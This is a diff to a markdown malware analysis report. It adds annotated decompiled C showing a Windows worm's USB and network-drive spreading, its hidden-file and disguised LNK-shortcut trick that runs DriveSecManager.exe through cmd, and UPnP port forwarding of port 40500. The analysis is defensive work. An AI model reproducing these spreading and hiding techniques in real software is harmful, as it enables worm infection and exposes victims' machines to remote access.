@@ -334,3 +334,125 @@ mw_prt_to_replaced_pdata = GlobalLock(hMem);
 ```
 
 
+#### spreading via USB and network drives
+creates a separate thread `CreateThread(0, 0, sub_406E00, 0, 0, 0);` for monitoring connected drives and automatic spreading via USB drives and network shares.
+
+The function continuously checks system logical drives (`mw_checks_logical_drives()`), filtering USB and network devices. For each detected drive, it collects information about size and volume name, then calls `sub_4068E0()` for infection:
+```c
+void __stdcall __noreturn sub_406E00(PVOID Parameter)
+{
+  GetModuleFileNameW(0, &Filename, 0x104u);
+  mw_current_file_size = sub_40EA80(&Filename);
+  while ( 1 )
+  {
+    v9 = mw_checks_logical_drives();
+    for ( i = 2; i <= 25; ++i )
+    {
+      v7 = sub_4064E0(v9, i, RootPathName);
+      if ( v7 == 2 || v7 == 4 )                 // if USB or network drive
+      {
+        GetVolumeInformationW(RootPathName, VolumeNameBuffer, 0x105u, 0, 0, &FileSystemFlags, 0, 0);
+        GetDiskFreeSpaceExW(RootPathName, 0, &TotalNumberOfBytes, 0);
+        wsprintfW(v5, L" (%dGB)", TotalNumberOfBytes.QuadPart / 0x40000000);
+        if ( !VolumeNameBuffer[0] )
+          wsprintfW(VolumeNameBuffer, L"Unnamed volume");
+        wsprintfW(v4, L"%s%s", VolumeNameBuffer, v5);
+        sub_4068E0(RootPathName, v4, FileSystemFlags, v7 == 4);
+```
+
+#### usb infect
+1. **Creating hidden structure:**  
+\- Creates a hidden directory with the volume name  
+\- Copies malware as `DriveSecManager.exe` with HIDDEN attribute  
+\- Creates an LNK shortcut file with folder icon  
+
+2. **Hiding legitimate files:**  
+\- Deletes some files (`.bat`, `.vbs`, `.cmd`, `.ps1`, etc.)  
+\- Moves all user files to the hidden directory  
+\- Leaves only the malicious LNK file visible  
+```c
+if ( !PathFileExistsW(pszPath) )
+  {
+    if ( !PathFileExistsW(PathName) && CreateDirectoryW(PathName, 0) )
+      SetFileAttributesW(PathName, 2u);         // FILE_ATTRIBUTE_HIDDEN
+    if ( PathFileExistsW(PathName) && CopyFileW(&Filename, pszPath, 0) )
+      SetFileAttributesW(pszPath, 2u);
+  }
+  if ( !PathFileExistsW(FileName) )
+  {
+    if ( a4 )
+      sub_406680(FileName, L"shell32.dll", 9); // network drive
+    else
+      sub_406680(FileName, L"shell32.dll", 8); // USB drive
+    SetFileAttributesW(FileName, 1u);           // FILE_ATTRIBUTE_READONLY
+  }
+```
+
+
+#### infected .LNK
+
+Uses COM interface `IShellLink` to create a `.lnk` file that:  
+\- Looks like a regular folder (`shell32.dll` icon)  
+\- Launches `cmd.exe` with command to open the hidden folder **AND** run `DriveSecManager.exe`  
+\- Victim sees their files (because the hidden directory opens), but malware runs simultaneously  
+```c
+void __cdecl sub_406680(int a1, int a2, int a3)
+{
+  v6 = CoInitialize(0);
+  if ( v6 >= 0 )
+  {
+    v6 = CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv); // creates IShellLink object
+    if ( v6 >= 0 && ppv )
+    {
+      // command: open hidden folder + launch malware
+      wsprintfW(v3, L"/c start %s & start %s\\DriveSecManager.exe", &unk_41430C, &unk_41430C);
+// ...[snip]...
+```
+
+
+#### NAT traversal via UPnP
+
+Malware implements NAT traversal to expose infected machine directly to the internet by configuring port forwarding on the router via UPnP protocol.
+
+**Finding gateway via SSDP**
+
+Sends SSDP M-SEARCH multicast request to discover UPnP-enabled routers on the local network. Broadcasts M-SEARCH to `239.255.255.250:1900` to discover `InternetGatewayDevice`, then collects all UPnP gateway URLs from SSDP responses  
+```c
+int __cdecl mw_gateway_find_by_SSDP(_DWORD *a1)
+{
+  v17 = WS2_32_23(2, 2, 17);           
+  if ( v17 != -1 )
+  {
+    v4[1] = WS2_32_9(1900);                     // port 1900 (SSDP)
+    v5 = WS2_32_11("239.255.255.250");          // SSDP multicast address
+    WS2_32_21(v17, 0xFFFF, 32, &v14, 1);        // SO_BROADCAST
+    lpString = "M-SEARCH * HTTP/1.1\r\n"
+               "ST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n"
+               "MX: 3\r\n"
+               "Man:\"ssdp:discover\"\r\n"
+               "HOST: 239.255.255.250:1900\r\n"
+               "\r\n";
+// ...[snip]...
+```
+**Port forwarding setup (`mw_nat_local`):**
+Determines local IP using `getsockname()` by establishing connection to external host `"www.update.microsoft.com"`
+Then configures router to forward external traffic for TCP/UDP port `40500` to infected machine:
+```c
+unsigned int mw_nat_local()
+{
+  CoInitializeEx(0, 2u);
+  v3 = 0;
+  result = mw_gateway_find_by_SSDP(&v3);
+  v4 = result;
+  if ( result )
+  {
+    for ( i = 0; i < v4; ++i )
+    {
+      lpszUrl = sub_40DC90(*(v3 + 4 * i));      // get UPnP control URL
+      if ( lpszUrl )
+      {
+        v1 = mw_local_ip();
+        sub_40E780(lpszUrl, "TCP", 0x9E34u, v1); // forward TCP port 40500
+        sub_40E780(lpszUrl, "UDP", 0x9E34u, v1); // forward UDP port 40500
+// ...[snip]...
+```
